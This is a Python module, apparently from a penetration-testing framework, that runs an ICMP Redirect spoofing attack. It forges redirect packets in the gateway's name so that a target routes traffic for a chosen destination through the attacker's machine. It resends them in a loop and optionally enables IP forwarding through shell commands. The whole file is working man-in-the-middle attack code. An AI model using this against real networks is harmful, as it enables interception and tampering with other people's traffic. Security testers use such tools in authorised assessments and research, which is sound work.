from termcolor import colored, cprint
from module import Module

from scapy.all import *
import threading
from printib import * 
from subprocess import Popen, PIPE
import time

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "ICMP Redirect",
                       "Description": "ICMP Redirect module spoof",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"interface": ["eth0", "Interface for sniffing", True],
                   "target": [None, "IP Target or IP address 1", True],
                   "gateway": [None, "IP Gateway or IP address 2", True],
                   "fakeGateway": [None, "Your IP address like a Gateway", True],
                   "destinationIP": [None, "IP Address destination", True],
                   "interval": ["5", "Interval ICMP Redirection", True],
                   "forward": ["False", "IPv4 Forward enabled", True],
                   "verbose": ["True", "Verbose", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._option_name = None


    # This module must be always implemented, it is called by the run option
    def run_module(self):

        def go(options):

            def enable_forward(options):
                if options["forward"][0] == "True":
                    try:
                        command = "echo 1 > /proc/sys/net/ipv4/ip_forward"
                        data = Popen(command, shell=True, stdout=PIPE).stdout.read()
                        print_ok("IPv4 forward enabled")
                        if options["verbose"][0] == "True":
                            for line in data.decode().split("\n"):
                                print_info(line)
                    except Exception as e:
                        raise Exception(str(e))

            def disable_forward(options):
                if options["forward"][0] == "True":
                    try:
                        command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
                        data = Popen(command, shell=True, stdout=PIPE).stdout.read()
                        print_ok("IPv4 forward disabled")
                        if options["verbose"][0] == "True":    
                            for line in data.decode().split("\n"):
                                print_info(line)
                    except Exception as e:
                        raise Exception(str(e))

            #Create packet ICMP Redirect
            enable_forward(options)
            icmp_redirect_packet = None
            ip = IP(src=options["gateway"][0],dst=options["target"][0])
            icmp = ICMP(type=5,code=1,gw=options["fakeGateway"][0])
            ip2 = IP(src=options["target"][0],dst=options["destinationIP"][0])
            icmp_redirect_packet = ip/icmp/ip2/ICMP()
            
            #ICMP Redirect Spoofing bucle
            t = threading.currentThread()
            while getattr(t, "do_run", True):    
                if options["verbose"][0] == "True":
                    send(icmp_redirect_packet,iface=options["interface"][0],verbose=True)
                else:
                    send(icmp_redirect_packet,iface=options["interface"][0],verbose=False)
                time.sleep(int(options["interval"][0]))
            
            #Stop forward and exit module
            disable_forward(options)

        e = threading.Event()
        thread1 = threading.Thread(target=go, args=(self.options,))
        thread1.start()        
       
        super(CustomModule, self).run(t=thread1)
